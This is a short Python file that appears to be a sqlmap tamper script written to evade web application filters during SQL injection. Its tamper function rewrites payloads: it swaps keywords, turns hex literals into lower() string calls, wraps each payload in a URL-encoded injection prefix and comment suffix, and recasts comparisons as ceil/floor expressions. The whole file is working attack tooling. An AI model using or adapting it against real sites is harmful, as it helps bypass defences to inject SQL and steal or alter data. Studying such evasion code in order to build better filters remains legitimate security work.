#__author__ = 'combie'
import re
import binascii
#f = open("out.dat","w")
def tamper(payload, **kwargs):
    d = {"ror":"rand","and":"or"} 
    #f.write(payload+"\n")
    t = re.findall('(0x\w+)',payload.lower()) 
    for expression in t:
        d[expression] = "lower('%s')" % binascii.unhexlify(expression[2:])   
    for key in d:
        payload = payload.lower().replace(key,d[key])
    prefix = "in%20(%27xxx%27))%20"
    subfix = "%20--%20"
    payload
    payload = prefix + payload + subfix
    t = re.findall('or (.+)>(\d+)',payload.lower())
    #print payload
    if t:
        payload = payload.replace(t[0][0]+'>'+t[0][1],"ceil(floor(%s/%s.5))"%(t[0][0],t[0][1]))
    #print payload
    #f.write(payload+"\n")
    return payload
